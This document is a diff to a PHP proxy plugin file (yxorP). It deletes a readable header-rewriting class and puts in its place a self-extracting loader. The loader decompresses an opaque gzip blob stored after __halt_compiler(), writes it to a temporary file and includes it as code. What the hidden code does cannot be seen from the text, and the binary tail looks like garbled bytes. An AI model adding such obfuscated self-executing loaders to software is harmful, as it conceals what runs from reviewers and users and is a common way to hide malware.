@@ -1,55 +1,4 @@
-<?php /* yxorP */
-
-use yxorP\http\ProxyEvent;
-
-class HeaderRewritePlugin extends AbstractPlugin
-{
-
-    public function onBeforeRequest(ProxyEvent $event)
-    {
-
-        $event['request']->headers->set('accept-encoding', 'identity');
-
-        $event['request']->headers->remove('referer');
-    }
-
-    public function onHeadersReceived(ProxyEvent $event)
-    {
-
-        $response = $event['response'];
-        $request_url = $event['request']->getUri();
-
-        if ($response->headers->has('location')) {
-
-            $location = $response->headers->get('location');
-
-            $response->headers->set('location', proxify_url($location, $request_url));
-        }
-
-        $code = $response->getStatusCode();
-        $text = $response->getStatusText();
-
-        if ($code >= 400 && $code <= 600) {
-            $GLOBALS['BUGSNAG']->notifyException(new RuntimeException("Error accessing resource: $code - $text"));
-        }
-
-        $forward_headers = array('content-type', 'zzzcontent-length', 'accept-ranges', 'content-range', 'content-disposition', 'location', 'set-cookie');
-
-        foreach ($response->headers->all() as $name => $value) {
-
-            if (!in_array($name, $forward_headers, true)) {
-                $response->headers->remove($name);
-            }
-        }
-
-        if (!$response->headers->has('content-disposition')) {
-
-            $url_path = parse_url($request_url, PHP_URL_PATH);
-            $filename = basename($url_path);
-
-            $response->headers->set('Content-Disposition', 'filename="' . $filename . '"');
-        }
-
-    }
-
-}
+<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();•SßOÛ0~Gâ¸UNP}˜ö°ÒN-CğPmU'@•ë\kÁÎl§¿&ş÷ÙNZH'–—$gßİ÷}÷İÅ·4Náü6k©Æpz~|t|”iÌÿccÒÇ±’ëÍÕ…éºS–P­ái„j‚+Å“lÁàÚ ˆ4fÚ(ÊL>>úãÒÀ>i6K8ƒy&˜áR€CœK…ü¡6Ák'h¢{…yŞ¾€{ò“¢ò$òÔîÇŒn÷5š€PÆ05mLF\,Hl
+7v?ZJá³\b`Ïæ¨PùL—ór˜L®‰ C¾ÄèƒtêT
++y¯„'‘§nå¢G9ÍTR¹»Ç¾@s¯xPåÈçì{”øÅT$‘Œ:ğ$«¨|Ãİ©ëVSaáÄ~­Ğ}—_“£+9-H­D|¾qœ‚}¿V…k–Dx©HgŒUpÓ­¡&Ó—ö((g6µçËwö¨N6_¿ßƒÏœœı.zğ¥ÓñzUØ^~£Û2¼¿¾ı1¸vÒXvWkgHK,¸‚If­øŒ¯ÁÆ•RR³­ÖÖ°`ÊL1üZtlçàÿPÂnÑŠªhZmyR¥è& L
+»”¦m6)ºMØn·»P‚bab,6FQ±@í»+>RDÜŠ§y1½ò$‰m›Iù‹ã/¸§,®·!M’ ª¡)è³fšKšdXãG7’O\Lsfş~ëóe³ßç!‹5÷ÕÊò×ªíÜ©:©j×Ëz{šRÛa¥TiÌ— äüŒoÆÓûÉh:Üİ¼E×œs;A/Ì¨öŸÁ¾è¬ãeø{u¶»ò½³R·3 RëDÿñò
